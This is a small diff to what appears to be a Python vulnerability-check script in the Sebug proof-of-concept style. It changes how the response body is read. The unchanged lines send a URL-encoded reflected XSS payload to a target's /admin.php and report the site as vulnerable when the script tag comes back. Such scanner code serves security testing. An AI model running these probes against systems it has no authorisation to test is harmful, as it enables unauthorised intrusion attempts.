@@ -49,7 +49,7 @@ class Poc(ABPoc):
             arg = '{target}'.format(target=self.target)
             payload_xss = "/admin.php?p=1%22%3E%3Cscript%3Ealert%28/SebugTest/%29%3C/script%3E"
             vul_url = arg + payload_xss
-            response = requests.get(vul_url).content
+            response = requests.get(vul_url).text
             if '>alert(/SebugTest/)' in response:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
